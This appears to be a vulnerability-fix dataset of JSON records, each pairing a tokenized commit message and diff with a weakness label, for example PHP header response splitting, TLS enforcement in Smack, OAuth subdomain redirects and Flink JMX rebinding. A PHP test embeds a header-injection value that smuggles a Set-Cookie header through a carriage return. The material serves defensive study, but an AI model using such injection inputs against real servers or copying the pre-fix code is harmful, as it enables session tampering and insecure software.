{"contents": ["fixed", "bug", "#60227:", "header()", "cannot", "detect", "the", "multi-line", "header", "with", "CR."], "code_tokens": ["@", "@", "-", "0", ",", "0", "+", "1", ",", "20", "@", "@", "-", "-", "TEST", "-", "-", "Bug", "#", "60227", "(", "header", "(", ")", "cannot", "detect", "the", "multi", "-", "line", "header", "with", "CR", ")", "-", "-", "FILE", "-", "-", "<", "?", "php", "header", "(", "\"", "X", "-", "Foo1", ":", "a", "\"", ");", "header", "(", "\"", "X", "-", "Foo2", ":", "b", "\\", "n", "\"", ");", "header", "(", "\"", "X", "-", "Foo3", ":", "c", "\\", "r", "\\", "n", "\"", ");", "header", "(", "\"", "X", "-", "Foo4", ":", "d", "\\", "r", "\"", ");", "header", "(", "\"", "X", "-", "Foo5", ":", "e", "\\", "rSet", "-", "Cookie", ":", "ID", "=", "123", "\"", ");", "echo", "'", "foo", "'", ";", "?", ">", "-", "-", "EXPECTF", "-", "-", "Warning", ":", "Header", "may", "not", "contain", "more", "than", "a", "single", "header", ",", "new", "line", "detected", ".", "in", "%", "s", "on", "line", "%", "d", "foo", "-", "-", "EXPECTHEADERS", "-", "-", "X", "-", "Foo1", ":", "a", "X", "-", "Foo2", ":", "b", "X", "-", "Foo3", ":", "c", "X", "-", "Foo4", ":", "d", "@", "@", "-", "712", ",", "7", "+", "712", ",", "7", "@", "@", "SAPI_API", "int", "sapi_header_op", "(", "sapi_header_op_enum", "op", ",", "void", "*", "arg", "TSRMLS_DC", ")", "}", "else", "{", "/", "*", "new", "line", "safety", "check", "*", "/", "char", "*", "s", "=", "header_line", ",", "*", "e", "=", "header_line", "+", "header_line_len", ",", "*", "p", ";", "while", "(", "s", "<", "e", "&", "&", "(", "p", "=", "memchr", "(", "s", ",", "'", "\\", "n", "'", ",", "(", "e", "-", "s", ")", "))", ")", "{", "while", "(", "s", "<", "e", "&", "&", "(", "(", "p", "=", "memchr", "(", "s", ",", "'", "\\", "n", "'", ",", "(", "e", "-", "s", ")", "))", "|", "|", "(", "p", "=", "memchr", "(", "s", ",", "'", "\\", "r", "'", ",", "(", "e", "-", "s", ")", "))", "))", "{", "if", "(", "*(", "p", "+", "1", ")", "=", "=", "'", "'", "|", "|", "*", "(", "p", "+", "1", ")", "=", "=", "'", "\\", "t", "'", ")", "{", "s", "=", "p", "+", "1", ";", "continue", ";"], "docstring_tokens": ["injection/response", "splitting"]}
{"contents": ["Move", "TLS", "Required", "check", "at", "the", "end", "of", "connect()", "It", "was", "a", "*very*", "bad", "idea", "to", "perform", "the", "SecurityMode.Required", "check", "in", "the", "connection's", "reader", "thread", "and", "not", "at", "the", "end", "of", "AbstractXMPPConnectin's", "connect().", ":/", "This", "behavior", "dates", "back", "to", "8e750912a765f77a4f178a4f307a8b42c2afb5ae", "Fixes", "SMACK-739"], "code_tokens": ["@", "@", "-", "362", ",", "6", "+", "362", ",", "7", "@", "@", "public", "synchronized", "AbstractXMPPConnection", "connect", "(", ")", "throws", "SmackException", ",", "IOEx", "/", "/", "Perform", "the", "actual", "connection", "to", "the", "XMPP", "service", "connectInternal", "(", ");", "return", "this", ";", "}", "@", "@", "-", "28", ",", "10", "+", "28", ",", "9", "@", "@", "import", "org", ".", "jivesoftware", ".", "smack", ".", "SmackException", ".", "AlreadyLoggedInException", ";", "import", "org", ".", "jivesoftware", ".", "smack", ".", "SmackException", ".", "NoResponseException", ";", "import", "org", ".", "jivesoftware", ".", "smack", ".", "SmackException", ".", "NotConnectedException", ";", "import", "org", ".", "jivesoftware", ".", "smack", ".", "SmackException", ".", "ConnectionException", ";", "import", "org", ".", "jivesoftware", ".", "smack", ".", "SmackException", ".", "SecurityRequiredByClientException", ";", "import", "org", ".", "jivesoftware", ".", "smack", ".", "SmackException", ".", "ConnectionException", ";", "import", "org", ".", "jivesoftware", ".", "smack", ".", "SmackException", ".", "SecurityRequiredByServerException", ";", "import", "org", ".", "jivesoftware", ".", "smack", ".", "SmackException", ".", "SecurityRequiredException", ";", "import", "org", ".", "jivesoftware", ".", "smack", ".", "SynchronizationPoint", ";", "import", "org", ".", "jivesoftware", ".", "smack", ".", "XMPPException", ".", "StreamErrorException", ";", "import", "org", ".", "jivesoftware", ".", "smack", ".", "XMPPConnection", ";", "@", "@", "-", "857", ",", "6", "+", "856", ",", "14", "@", "@", "protected", "void", "connectInternal", "(", ")", "throws", "SmackException", ",", "IOException", ",", "XMPPExcepti", "/", "/", "Wait", "with", "SASL", "auth", "until", "the", "SASL", "mechanisms", "have", "been", "received", "saslFeatureReceived", ".", "checkIfSuccessOrWaitOrThrow", "(", ");", "/", "/", "If", "TLS", "is", "required", "but", "the", "server", "doesn", "'", "t", "offer", "it", ",", "disconnect", "/", "/", "from", "the", "server", "and", "throw", "an", "error", ".", "First", "check", "if", "we", "'", "ve", "already", "negotiated", "TLS", "/", "/", "and", "are", "secure", ",", "however", "(", "features", "get", "parsed", "a", "second", "time", "after", "TLS", "is", "established", ")", ".", "if", "(", "!", "isSecureConnection", "(", ")", "&", "&", "getConfiguration", "(", ").", "getSecurityMode", "(", ")", "=", "=", "SecurityMode", ".", "required", ")", "{", "shutdown", "(", ");", "throw", "new", "SecurityRequiredByClientException", "(", ");", "}", "/", "/", "Make", "note", "of", "the", "fact", "that", "we", "'", "re", "now", "connected", ".", "connected", "=", "true", ";", "callConnectionConnectedListener", "(", ");", "@", "@", "-", "897", ",", "7", "+", "904", ",", "7", "@", "@", "protected", "void", "setWriter", "(", "Writer", "writer", ")", "{", "}", "@", "Override", "protected", "void", "afterFeaturesReceived", "(", ")", "throws", "SecurityRequiredException", ",", "NotConnectedException", "{", "protected", "void", "afterFeaturesReceived", "(", ")", "throws", "NotConnectedException", "{", "StartTls", "startTlsFeature", "=", "getFeature", "(", "StartTls", ".", "ELEMENT", ",", "StartTls", ".", "NAMESPACE", ")", ";", "if", "(", "startTlsFeature", "!", "=", "null", ")", "{", "if", "(", "startTlsFeature", ".", "required", "(", ")", "&", "&", "config", ".", "getSecurityMode", "(", ")", "=", "=", "SecurityMode", ".", "disabled", ")", "{", "@", "@", "-", "909", ",", "13", "+", "916", ",", "6", "@", "@", "protected", "void", "afterFeaturesReceived", "(", ")", "throws", "SecurityRequiredException", ",", "NotConn", "send", "(", "new", "StartTls", "(", "))", ";", "}", "}", "/", "/", "If", "TLS", "is", "required", "but", "the", "server", "doesn", "'", "t", "offer", "it", ",", "disconnect", "/", "/", "from", "the", "server", "and", "throw", "an", "error", ".", "First", "check", "if", "we", "'", "ve", "already", "negotiated", "TLS", "/", "/", "and", "are", "secure", ",", "however", "(", "features", "get", "parsed", "a", "second", "time", "after", "TLS", "is", "established", ")", ".", "if", "(", "!", "isSecureConnection", "(", ")", "&", "&", "startTlsFeature", "=", "=", "null", "&", "&", "getConfiguration", "(", ").", "getSecurityMode", "(", ")", "=", "=", "SecurityMode", ".", "required", ")", "{", "throw", "new", "SecurityRequiredByClientException", "(", ");", "}", "if", "(", "getSASLAuthentication", "(", ").", "authenticationSuccessful", "(", "))", "{", "/", "/", "If", "we", "have", "received", "features", "after", "the", "SASL", "has", "been", "successfully", "completed", ",", "then", "we"], "docstring_tokens": ["race", "condition"]}
{"contents": ["Fix", "potential", "crash", "with", "sys_move_pages", "We", "incorrectly", "depended", "on", "the", "'node_state/node_isset()'", "functions", "testing", "the", "node", "range,", "rather", "than", "checking", "it", "explicitly.", "That's", "not", "reliable,", "even", "if", "it", "might", "often", "happen", "to", "work.", "So", "do", "the", "proper", "explicit", "test.", "Reported-by:", "Marcus", "Meissner", "<meissner@suse.de>", "Acked-and-tested-by:", "Brice", "Goglin", "<Brice.Goglin@inria.fr>", "Acked-by:", "Hugh", "Dickins", "<hugh.dickins@tiscali.co.uk>", "Cc:", "stable@kernel.org", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>"], "code_tokens": ["@", "@", "-", "912", ",", "6", "+", "912", ",", "9", "@", "@", "static", "int", "do_pages_move", "(", "struct", "mm_struct", "*", "mm", ",", "struct", "task_struct", "*", "task", ",", "goto", "out_pm", ";", "err", "=", "-", "ENODEV", ";", "if", "(", "node", "<", "0", "|", "|", "node", ">", "=", "MAX_NUMNODES", ")", "goto", "out_pm", ";", "if", "(", "!", "node_state", "(", "node", ",", "N_HIGH_MEMORY", ")", ")", "goto", "out_pm", ";"], "docstring_tokens": ["information", "leakage"]}
{"contents": ["better", "handle", "retrieving", "provider", "location"], "code_tokens": ["@", "@", "-", "62", ",", "7", "+", "62", ",", "7", "@", "@", "$", "(", "function", "(", ")", "{", "$", "('", ".", "ux", "-", "server", "-", "ready", "-", "panel", "'", ").", "removeClass", "(", "'", "ux", "-", "hidden", "'", ");", "var", "providerLink", "=", "$", "($", "('", ".", "ux", "-", "provider", "-", "url", "'", ").", "get", "(", "0", ")", ");", "providerLink", ".", "attr", "(", "'", "href", "'", ",", "window", ".", "location", ".", "href", "+", "'", "ejb", "'", ");", "providerLink", ".", "html", "(", "window", ".", "location", ".", "href", "+", "'", "ejb", "'", ");", "providerLink", ".", "html", "(", "window", ".", "location", ".", "origin", "+", "window", ".", "location", ".", "pathname", "+", "'", "ejb", "'", ");", "}", "else", "if", "(", "systemStatus", ".", "status", "=", "==", "'", "REBOOT_REQUIRED", "'", ")", "{", "$", "('", ".", "ux", "-", "installer", "-", "reboot", "-", "panel", "'", ").", "removeClass", "(", "'", "ux", "-", "hidden", "'", ");", "}", "else", "{"], "docstring_tokens": ["cross-site", "scripting"]}
{"contents": ["Simplify", "Default", "Configuration", "Switching", "off", "matchSubdomains", "by", "default", "for", "a", "simpler", "initial", "configuration."], "code_tokens": ["@", "@", "-", "43", ",", "7", "+", "43", ",", "7", "@", "@", "private", "Collection", "<", "String", ">", "redirectGrantTypes", "=", "Arrays", ".", "asList", "(", "\"", "implicit", "\"", ",", "\"", "authorization_code", "\"", ");", "private", "boolean", "matchSubdomains", "=", "true", ";", "private", "boolean", "matchSubdomains", "=", "false", ";", "private", "boolean", "matchPorts", "=", "true", ";", "@", "@", "-", "7", ",", "24", "+", "7", ",", "30", "@", "@", "import", "java", ".", "util", ".", "HashSet", ";", "import", "java", ".", "util", ".", "Set", ";", "import", "org", ".", "junit", ".", "Before", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "springframework", ".", "security", ".", "oauth2", ".", "common", ".", "exceptions", ".", "RedirectMismatchException", ";", "import", "org", ".", "springframework", ".", "security", ".", "oauth2", ".", "provider", ".", "client", ".", "BaseClientDetails", ";", "import", "org", ".", "springframework", ".", "security", ".", "oauth2", ".", "provider", ".", "endpoint", ".", "DefaultRedirectResolver", ";", "public", "class", "SubdomainRedirectResolverTests", "{", "private", "final", "DefaultRedirectResolver", "resolver", "=", "new", "DefaultRedirectResolver", "(", ");", "private", "DefaultRedirectResolver", "resolver", ";", "private", "final", "BaseClientDetails", "client", "=", "new", "BaseClientDetails", "(", ");", "{", "client", ".", "setAuthorizedGrantTypes", "(", "Collections", ".", "singleton", "(", "\"", "authorization_code", "\"", "))", ";", "}", "@", "Before", "public", "void", "setup", "(", ")", "{", "resolver", "=", "new", "DefaultRedirectResolver", "(", ");", "}", "@", "Test", "public", "void", "testRedirectMatch", "(", ")", "throws", "Exception", "{", "resolver", ".", "setMatchSubdomains", "(", "true", ")", ";", "Set", "<", "String", ">", "redirectUris", "=", "new", "HashSet", "<", "String", ">", "(", "Arrays", ".", "asList", "(", "\"", "https", ":", "//", "watchdox", ".", "com", "\"", "))", ";", "client", ".", "setRegisteredRedirectUri", "(", "redirectUris", ")", ";", "String", "requestedRedirect", "=", "\"", "https", ":", "//", "anywhere", ".", "watchdox", ".", "com", "\"", ";", "@", "@", "-", "136", ",", "12", "+", "136", ",", "20", "@", "@", "public", "void", "testRedirectNotMatchingSubdomain", "(", ")", "throws", "Exception", "{", "/", "/", "gh", "-", "747", "@", "Test", "public", "void", "testRedirectMatchingSubdomain", "(", ")", "throws", "Exception", "{", "resolver", ".", "setMatchSubdomains", "(", "true", ")", ";", "Set", "<", "String", ">", "redirectUris", "=", "new", "HashSet", "<", "String", ">", "(", "Arrays", ".", "asList", "(", "\"", "https", ":", "//", "anywhere", ".", "com", "/", "foo", "\"", "))", ";", "String", "requestedRedirect", "=", "\"", "https", ":", "//", "2", ".", "anywhere", ".", "com", "/", "foo", "\"", ";", "client", ".", "setRegisteredRedirectUri", "(", "redirectUris", ")", ";", "assertEquals", "(", "requestedRedirect", ",", "resolver", ".", "resolveRedirect", "(", "requestedRedirect", ",", "client", ")", ");", "}", "@", "Test", "(", "expected", "=", "RedirectMismatchException", ".", "class", ")", "public", "void", "testRedirectMatchSubdomainsDefaultsFalse", "(", ")", "{", "Set", "<", "String", ">", "redirectUris", "=", "new", "HashSet", "<", "String", ">", "(", "Arrays", ".", "asList", "(", "\"", "https", ":", "//", "anywhere", ".", "com", "\"", "))", ";", "client", ".", "setRegisteredRedirectUri", "(", "redirectUris", ")", ";", "resolver", ".", "resolveRedirect", "(", "\"", "https", ":", "//", "2", ".", "anywhere", ".", "com", "\"", ",", "client", ")", ";", "}", "/", "/", "gh", "-", "746", "@", "Test", "(", "expected", "=", "RedirectMismatchException", ".", "class", ")", "public", "void", "testRedirectNotMatchingPort", "(", ")", "throws", "Exception", "{"], "docstring_tokens": ["open", "redirector"]}
{"contents": ["netfilter:", "nf_conntrack:", "reserve", "two", "bytes", "for", "nf_ct_ext->len", "\"len\"", "contains", "sizeof(nf_ct_ext)", "and", "size", "of", "extensions.", "In", "a", "worst", "case", "it", "can", "contain", "all", "extensions.", "Bellow", "you", "can", "find", "sizes", "for", "all", "types", "of", "extensions.", "Their", "sum", "is", "definitely", "bigger", "than", "256.", "nf_ct_ext_types[0]->len", "=", "24", "nf_ct_ext_types[1]->len", "=", "32", "nf_ct_ext_types[2]->len", "=", "24", "nf_ct_ext_types[3]->len", "=", "32", "nf_ct_ext_types[4]->len", "=", "152", "nf_ct_ext_types[5]->len", "=", "2", "nf_ct_ext_types[6]->len", "=", "16", "nf_ct_ext_types[7]->len", "=", "8", "I", "have", "seen", "\"len\"", "up", "to", "280", "and", "my", "host", "has", "crashes", "w/o", "this", "patch.", "The", "right", "way", "to", "fix", "this", "problem", "is", "reducing", "the", "size", "of", "the", "ecache", "extension", "(4)", "and", "Florian", "is", "going", "to", "do", "this,", "but", "these", "changes", "will", "be", "quite", "large", "to", "be", "appropriate", "for", "a", "stable", "tree.", "Fixes:", "5b423f6a40a0", "(netfilter:", "nf_conntrack:", "fix", "racy", "timer", "handling", "with", "reliable)", "Cc:", "Pablo", "Neira", "Ayuso", "<pablo@netfilter.org>", "Cc:", "Patrick", "McHardy", "<kaber@trash.net>", "Cc:", "Jozsef", "Kadlecsik", "<kadlec@blackhole.kfki.hu>", "Cc:", "\"David", "S.", "Miller\"", "<davem@davemloft.net>", "Signed-off-by:", "Andrey", "Vagin", "<avagin@openvz.org>", "Signed-off-by:", "Pablo", "Neira", "Ayuso", "<pablo@netfilter.org>"], "code_tokens": ["@", "@", "-", "47", ",", "8", "+", "47", ",", "8", "@", "@", "enum", "nf_ct_ext_id", "{", "/", "*", "Extensions", ":", "optional", "stuff", "which", "isn", "'", "t", "permanently", "in", "struct", ".", "*", "/", "struct", "nf_ct_ext", "{", "struct", "rcu_head", "rcu", ";", "u8", "offset", "[", "NF_CT_EXT_NUM", "]", ";", "u8", "len", ";", "u16", "offset", "[", "NF_CT_EXT_NUM", "]", ";", "u16", "len", ";", "char", "data", "[", "0", "]", ";", "}", ";"], "docstring_tokens": ["pointer", "dereference"]}
{"contents": ["[FLINK-16697][metrics][jmx]", "Disable", "rebinding"], "code_tokens": ["@", "@", "-", "40", ",", "19", "+", "40", ",", "24", "@", "@", "import", "javax", ".", "management", ".", "NotCompliantMBeanException", ";", "import", "javax", ".", "management", ".", "ObjectName", ";", "import", "javax", ".", "management", ".", "remote", ".", "JMXConnectorServer", ";", "import", "javax", ".", "management", ".", "remote", ".", "JMXConnectorServerFactory", ";", "import", "javax", ".", "management", ".", "remote", ".", "JMXServiceURL", ";", "import", "javax", ".", "management", ".", "remote", ".", "rmi", ".", "RMIConnectorServer", ";", "import", "javax", ".", "management", ".", "remote", ".", "rmi", ".", "RMIJRMPServerImpl", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "lang", ".", "management", ".", "ManagementFactory", ";", "import", "java", ".", "net", ".", "MalformedURLException", ";", "import", "java", ".", "rmi", ".", "NoSuchObjectException", ";", "import", "java", ".", "rmi", ".", "registry", ".", "LocateRegistry", ";", "import", "java", ".", "rmi", ".", "NotBoundException", ";", "import", "java", ".", "rmi", ".", "Remote", ";", "import", "java", ".", "rmi", ".", "RemoteException", ";", "import", "java", ".", "rmi", ".", "registry", ".", "Registry", ";", "import", "java", ".", "rmi", ".", "server", ".", "UnicastRemoteObject", ";", "import", "java", ".", "util", ".", "HashMap", ";", "import", "java", ".", "util", ".", "Hashtable", ";", "import", "java", ".", "util", ".", "Iterator", ";", "import", "java", ".", "util", ".", "Map", ";", "import", "java", ".", "util", ".", "concurrent", ".", "atomic", ".", "AtomicReference", ";", "/", "**", "*", "{", "@", "link", "MetricReporter", "}", "that", "exports", "{", "@", "link", "Metric", "Metrics", "}", "via", "JMX", ".", "@", "@", "-", "455", ",", "42", "+", "460", ",", "31", "@", "@", "public", "long", "getCount", "(", ")", "{", "/", "**", "*", "JMX", "Server", "implementation", "that", "JMX", "clients", "can", "connect", "to", ".", "*", "*", "Heavily", "based", "on", "j256", "simplejmx", "project", "*", "Originally", "based", "on", "j256", "simplejmx", "project", "*", "*", "https", ":", "//", "github", ".", "com", "/", "j256", "/", "simplejmx", "/", "blob", "/", "master", "/", "src", "/", "main", "/", "java", "/", "com", "/", "j256", "/", "simplejmx", "/", "server", "/", "JmxServer", ".", "java", "*", "/", "private", "static", "class", "JMXServer", "{", "private", "Registry", "rmiRegistry", ";", "private", "JMXConnectorServer", "connector", ";", "private", "int", "port", ";", "private", "final", "AtomicReference", "<", "Remote", ">", "rmiServerReference", "=", "new", "AtomicReference", "<", ">(", ");", "public", "void", "start", "(", "int", "port", ")", "throws", "IOException", "{", "if", "(", "rmiRegistry", "!", "=", "null", "&", "&", "connector", "!", "=", "null", ")", "{", "LOG", ".", "debug", "(", "\"", "JMXServer", "is", "already", "running", ".", "\")", ";", "return", ";", "}", "startRmiRegistry", "(", "port", ")", ";", "startJmxService", "(", "port", ")", ";", "internalStart", "(", "port", ")", ";", "this", ".", "port", "=", "port", ";", "}", "/", "**", "*", "Starts", "an", "RMI", "Registry", "that", "allows", "clients", "to", "lookup", "the", "JMX", "IP", "/", "port", ".", "*", "*", "@", "param", "port", "rmi", "port", "to", "use", "*", "@", "throws", "IOException", "*", "/", "private", "void", "startRmiRegistry", "(", "int", "port", ")", "throws", "IOException", "{", "rmiRegistry", "=", "LocateRegistry", ".", "createRegistry", "(", "port", ")", ";", "}", "private", "void", "internalStart", "(", "int", "port", ")", "throws", "IOException", "{", "rmiServerReference", ".", "set", "(", "null", ")", ";", "/", "/", "this", "allows", "clients", "to", "lookup", "the", "JMX", "service", "rmiRegistry", "=", "new", "JmxRegistry", "(", "port", ",", "\"", "jmxrmi", "\"", ",", "rmiServerReference", ")", ";", "/", "**", "*", "Starts", "a", "JMX", "connector", "that", "allows", "(", "un", ")", "registering", "MBeans", "with", "the", "MBean", "server", "and", "RMI", "invocations", ".", "*", "*", "@", "param", "port", "jmx", "port", "to", "use", "*", "@", "throws", "IOException", "*", "/", "private", "void", "startJmxService", "(", "int", "port", ")", "throws", "IOException", "{", "String", "serviceUrl", "=", "\"", "service", ":", "jmx", ":", "rmi", ":", "//", "localhost", ":", "\"", "+", "port", "+", "\"", "/", "jndi", "/", "rmi", ":", "//", "localhost", ":", "\"", "+", "port", "+", "\"", "/", "jmxrmi", "\"", ";", "JMXServiceURL", "url", ";", "try", "{", "@", "@", "-", "499", ",", "12", "+", "493", ",", "20", "@", "@", "private", "void", "startJmxService", "(", "int", "port", ")", "throws", "IOException", "{", "throw", "new", "IllegalArgumentException", "(", "\"", "Malformed", "service", "url", "created", "\"", "+", "serviceUrl", ",", "e", ")", ";", "}", "connector", "=", "JMXConnectorServerFactory", ".", "newJMXConnectorServer", "(", "url", ",", "null", ",", "ManagementFactory", ".", "getPlatformMBeanServer", "(", "))", ";", "final", "RMIJRMPServerImpl", "rmiServer", "=", "new", "RMIJRMPServerImpl", "(", "port", ",", "null", ",", "null", ",", "null", ")", ";", "connector", "=", "new", "RMIConnectorServer", "(", "url", ",", "null", ",", "rmiServer", ",", "ManagementFactory", ".", "getPlatformMBeanServer", "(", "))", ";", "connector", ".", "start", "(", ");", "/", "/", "we", "can", "'", "t", "pass", "the", "created", "stub", "directly", "to", "the", "registry", "since", "this", "would", "form", "a", "cyclic", "dependency", ":", "/", "/", "-", "you", "can", "only", "start", "the", "connector", "after", "the", "registry", "was", "started", "/", "/", "-", "you", "can", "only", "create", "the", "stub", "after", "the", "connector", "was", "started", "/", "/", "-", "you", "can", "only", "start", "the", "registry", "after", "the", "stub", "was", "created", "rmiServerReference", ".", "set", "(", "rmiServer", ".", "toStub", "(", "))", ";", "}", "public", "void", "stop", "(", ")", "throws", "IOException", "{", "rmiServerReference", ".", "set", "(", "null", ")", ";", "if", "(", "connector", "!", "=", "null", ")", "{", "try", "{", "connector", ".", "stop", "(", ");", "@", "@", "-", "522", ",", "5", "+", "524", ",", "51", "@", "@", "public", "void", "stop", "(", ")", "throws", "IOException", "{", "}", "}", "}", "/", "**", "*", "A", "registry", "that", "only", "exposes", "a", "single", "remote", "object", ".", "*", "/", "@", "SuppressWarnings", "(", "\"", "restriction", "\"", ")", "private", "static", "class", "JmxRegistry", "extends", "sun", ".", "rmi", ".", "registry", ".", "RegistryImpl", "{", "private", "final", "String", "lookupName", ";", "private", "final", "AtomicReference", "<", "Remote", ">", "remoteServerStub", ";", "JmxRegistry", "(", "final", "int", "port", ",", "final", "String", "lookupName", ",", "final", "AtomicReference", "<", "Remote", ">", "remoteServerStub", ")", "throws", "RemoteException", "{", "super", "(", "port", ")", ";", "this", ".", "lookupName", "=", "lookupName", ";", "this", ".", "remoteServerStub", "=", "remoteServerStub", ";", "}", "@", "Override", "public", "Remote", "lookup", "(", "String", "s", ")", "throws", "NotBoundException", "{", "if", "(", "lookupName", ".", "equals", "(", "s", ")", ")", "{", "final", "Remote", "remote", "=", "remoteServerStub", ".", "get", "(", ");", "if", "(", "remote", "!", "=", "null", ")", "{", "return", "remote", ";", "}", "}", "throw", "new", "NotBoundException", "(", "\"", "Not", "bound", ".", "\")", ";", "}", "@", "Override", "public", "void", "bind", "(", "String", "s", ",", "Remote", "remote", ")", "{", "/", "/", "this", "is", "called", "from", "RMIConnectorServer", "#", "start", ";", "don", "'", "t", "throw", "a", "general", "AccessException", "}", "@", "Override", "public", "void", "unbind", "(", "String", "s", ")", "{", "/", "/", "this", "is", "called", "from", "RMIConnectorServer", "#", "stop", ";", "don", "'", "t", "throw", "a", "general", "AccessException", "}", "@", "Override", "public", "void", "rebind", "(", "String", "s", ",", "Remote", "remote", ")", "{", "/", "/", "might", "as", "well", "not", "throw", "an", "exception", "here", "given", "that", "the", "others", "don", "'", "t", "}", "@", "Override", "public", "String", "[", "]", "list", "(", ")", "{", "return", "new", "String", "[", "]{", "lookupName", "}", ";", "}", "}", "}", "}"], "docstring_tokens": ["information", "disclosure"]}
{"contents": ["Aligned", "with", "wicket8.x"], "code_tokens": ["@", "@", "-", "18", ",", "7", "+", "18", ",", "7", "@", "@", "Once", "done", ",", "just", "include", "the", "jar", "(", "s", ")", "in", "your", "project", "'", "s", "build", "path", ".", "<", "dependency", ">", "<", "groupId", ">", "com", ".", "googlecode", ".", "wicket", "-", "jquery", "-", "ui", "<", "/", "groupId", ">", "<", "artifactId", ">", "wicket", "-", "jquery", "-", "ui", "<", "/", "artifactId", ">", "<", "version", ">", "6", ".", "27", ".", "0", "<", "/", "version", ">", "<", "version", ">", "6", ".", "28", ".", "0", "<", "/", "version", ">", "<", "/", "dependency", ">", "`", "``", "@", "@", "-", "48", ",", "6", "+", "48", ",", "7", "@", "@", "If", "the", "version", "you", "specified", "is", "*", "snapshot", "*", ",", "you", "might", "define", "this", "repository", ":", "<", "tr", ">", "<", "td", ">", "8", ".", "0", ".", "0", "-", "M3", "<", "/", "td", ">", "<", "td", ">", "8", ".", "0", ".", "0", "-", "M3", "<", "/", "td", ">", "<", "td", ">", "1", ".", "12", ".", "1", "<", "/", "td", ">", "</", "tr", ">", "<", "tr", ">", "<", "td", ">", "8", ".", "0", ".", "0", "-", "M2", "<", "/", "td", ">", "<", "td", ">", "8", ".", "0", ".", "0", "-", "M2", "<", "/", "td", ">", "<", "td", ">", "1", ".", "12", ".", "0", "<", "/", "td", ">", "</", "tr", ">", "<", "tr", ">", "<", "td", ">", "8", ".", "0", ".", "0", "-", "M1", "<", "/", "td", ">", "<", "td", ">", "8", ".", "0", ".", "0", "-", "M1", "<", "/", "td", ">", "<", "td", ">", "1", ".", "12", ".", "0", "<", "/", "td", ">", "</", "tr", ">", "<", "tr", ">", "<", "td", ">", "7", ".", "9", ".", "0", "<", "/", "td", ">", "<", "td", ">", "7", ".", "9", ".", "0", "<", "/", "td", ">", "<", "td", ">", "1", ".", "12", ".", "1", "<", "/", "td", ">", "</", "tr", ">", "<", "tr", ">", "<", "td", ">", "7", ".", "8", ".", "0", "<", "/", "td", ">", "<", "td", ">", "7", ".", "8", ".", "0", "<", "/", "td", ">", "<", "td", ">", "1", ".", "12", ".", "1", "<", "/", "td", ">", "</", "tr", ">", "<", "tr", ">", "<", "td", ">", "7", ".", "7", ".", "0", "<", "/", "td", ">", "<", "td", ">", "7", ".", "7", ".", "0", "<", "/", "td", ">", "<", "td", ">", "1", ".", "12", ".", "1", "<", "/", "td", ">", "</", "tr", ">", "<", "tr", ">", "<", "td", ">", "7", ".", "6", ".", "0", "<", "/", "td", ">", "<", "td", ">", "7", ".", "6", ".", "0", "<", "/", "td", ">", "<", "td", ">", "1", ".", "12", ".", "1", "<", "/", "td", ">", "</", "tr", ">", "@", "@", "-", "94", ",", "6", "+", "95", ",", "7", "@", "@", "If", "the", "version", "you", "specified", "is", "*", "snapshot", "*", ",", "you", "might", "define", "this", "repository", ":", "<", "tr", ">", "<", "td", ">", "8", ".", "0", ".", "0", "-", "M3", "<", "/", "td", ">", "<", "td", ">", "8", ".", "0", ".", "0", "-", "M3", "<", "/", "td", ">", "<", "td", ">", "2016", ".", "3", ".", "1118", "(", "ASFv2", ")", "</", "td", ">", "</", "tr", ">", "<", "tr", ">", "<", "td", ">", "8", ".", "0", ".", "0", "-", "M2", "<", "/", "td", ">", "<", "td", ">", "8", ".", "0", ".", "0", "-", "M2", "<", "/", "td", ">", "<", "td", ">", "2016", ".", "3", ".", "1028", "(", "ASFv2", ")", "</", "td", ">", "</", "tr", ">", "<", "tr", ">", "<", "td", ">", "8", ".", "0", ".", "0", "-", "M1", "<", "/", "td", ">", "<", "td", ">", "8", ".", "0", ".", "0", "-", "M1", "<", "/", "td", ">", "<", "td", ">", "2016", ".", "2", ".", "714", "(", "ASFv2", ")", "</", "td", ">", "</", "tr", ">", "<", "tr", ">", "<", "td", ">", "7", ".", "9", ".", "0", "<", "/", "td", ">", "<", "td", ">", "7", ".", "9", ".", "0", "<", "/", "td", ">", "<", "td", ">", "2017", ".", "2", ".", "621", "(", "ASFv2", ")", "</", "td", ">", "</", "tr", ">", "<", "tr", ">", "<", "td", ">", "7", ".", "8", ".", "0", "<", "/", "td", ">", "<", "td", ">", "7", ".", "8", ".", "0", "<", "/", "td", ">", "<", "td", ">", "2017", ".", "2", ".", "621", "(", "ASFv2", ")", "</", "td", ">", "</", "tr", ">", "<", "tr", ">", "<", "td", ">", "7", ".", "7", ".", "0", "<", "/", "td", ">", "<", "td", ">", "7", ".", "7", ".", "0", "<", "/", "td", ">", "<", "td", ">", "2017", ".", "1", ".", "223", "(", "ASFv2", ")", "</", "td", ">", "</", "tr", ">", "<", "tr", ">", "<", "td", ">", "7", ".", "6", ".", "0", "<", "/", "td", ">", "<", "td", ">", "7", ".", "6", ".", "0", "<", "/", "td", ">", "<", "td", ">", "2016", ".", "3", ".", "1118", "(", "ASFv2", ")", "</", "td", ">", "</", "tr", ">", "@", "@", "-", "140", ",", "7", "+", "142", ",", "7", "@", "@", "To", "use", "wicket", "-", "jquery", "-", "ui", "with", "a", "standard", "theme", ",", "just", "add", "the", "corresponding", "theme", "<", "dependency", ">", "<", "groupId", ">", "com", ".", "googlecode", ".", "wicket", "-", "jquery", "-", "ui", "<", "/", "groupId", ">", "<", "artifactId", ">", "wicket", "-", "jquery", "-", "ui", "-", "theme", "-", "uilightness", "<", "/", "artifactId", ">", "<", "version", ">", "6", ".", "27", ".", "0", "<", "/", "version", ">", "<", "version", ">", "6", ".", "28", ".", "0", "<", "/", "version", ">", "<", "/", "dependency", ">", "`", "``", "@", "@", "-", "156", ",", "7", "+", "158", ",", "7", "@", "@", "To", "use", "wicket", "-", "kendo", "-", "ui", "with", "a", "standard", "theme", ",", "just", "add", "the", "corresponding", "theme", "d", "<", "dependency", ">", "<", "groupId", ">", "com", ".", "googlecode", ".", "wicket", "-", "jquery", "-", "ui", "<", "/", "groupId", ">", "<", "artifactId", ">", "wicket", "-", "kendo", "-", "ui", "-", "theme", "-", "default", "<", "/", "artifactId", ">", "<", "version", ">", "6", ".", "27", ".", "0", "<", "/", "version", ">", "<", "version", ">", "6", ".", "28", ".", "0", "<", "/", "version", ">", "<", "/", "dependency", ">", "`", "``", "@", "@", "-", "28", ",", "6", "+", "28", ",", "7", "@", "@", "/", "**", "*", "Utility", "class", "for", "handling", "feedback", "session", "messages", "and", 